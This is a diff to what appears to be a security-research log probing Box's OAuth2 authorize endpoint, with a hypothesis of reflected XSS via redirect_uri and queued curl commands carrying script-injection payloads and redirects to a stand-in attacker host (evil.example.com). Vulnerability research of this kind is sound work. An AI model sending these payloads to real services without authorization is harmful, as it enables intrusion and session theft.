@@ -865,3 +865,18 @@ testability: HUMAN_ONLY
 ## 2026-08-20 15:52:14 UTC account.box.com (ling3)
 ## 2026-08-20 16:17:02 UTC account.box.com (ling3)
 ## 2026-08-20 16:53:01 UTC account.box.com (ling3)
+## 2026-08-20 17:16:22 UTC account.box.com (bigpickle)
+[NEW] cloud.app.box.com: OAuth2 `/api/oauth2/token` preflight returns `*` wildcard with POST+auth headers but no credentials — safe per CORS spec
+[LEARN] REJECTED XSS-in-redirect_uri @ cloud.app.box.com: Need to verify if `redirect_uri=javascript:alert(1)` is reflected verbatim or sanitized in the HTML payload. Previous cycles confirmed param reflection in `Box.prefetchedData.errorParams` JSON but haven't tested JS protocol injection specifically.
+[HYP] Reflected parameter injection via redirect_uri in OAuth2 authorize page
+class: XSS
+asset: cloud.app.box.com/api/oauth2/authorize
+confidence: 30
+reasoning: All query parameters (`redirect_uri`, `state`, `scope`, `client_id`) are reflected in `Box.prefetchedData.errorParams` JSON embedded in the HTML. JSON-embedded values in script context may be exploitable if not properly escaped (e.g., `</script>` or quote-break in redirect_uri). No JS-protocol or HTML-context test has been run yet.
+verify_steps: `curl -sD- -H "User-Agent: box-research/1.0 (research)" "https://cloud.app.box.com/api/oauth2/authorize?client_id=test&redirect_uri=%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&response_type=code" 2>&1 | head -80`
+impact: If reflected unescaped in HTML/script context, DOM-based XSS leading to session theft. Severity: Critical
+testability: PASSIVE
+[NEXT] XSS-REFLECT: `curl -sD- -H "User-Agent: box-research/1.0 (research)" "https://cloud.app.box.com/api/oauth2/authorize?client_id=test&redirect_uri=%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&response_type=code"`
+[NEXT] XSS-REFLECT2: `curl -sD- -H "User-Agent: box-research/1.0 (research)" "https://cloud.app.box.com/api/oauth2/authorize?client_id=test&redirect_uri=\\%22%3E%3Cimg+src=x+onerror=alert(1)%3E&response_type=code"`
+[NEXT] OAUTH-CLIENTS: `curl -sD- -H "User-Agent: box-research/1.0 (research)" "https://cloud.app.box.com/api/oauth2/authorize?client_id=boxsdk&redirect_uri=https://evil.example.com/callback&response_type=code"`
+[NEXT] OAUTH-CLIENTS2: `curl -sD- -H "User-Agent: box-research/1.0 (research)" "https://app.box.com/api/oauth2/authorize?client_id=test&redirect_uri=https://evil.example.com/callback&response_type=code"`
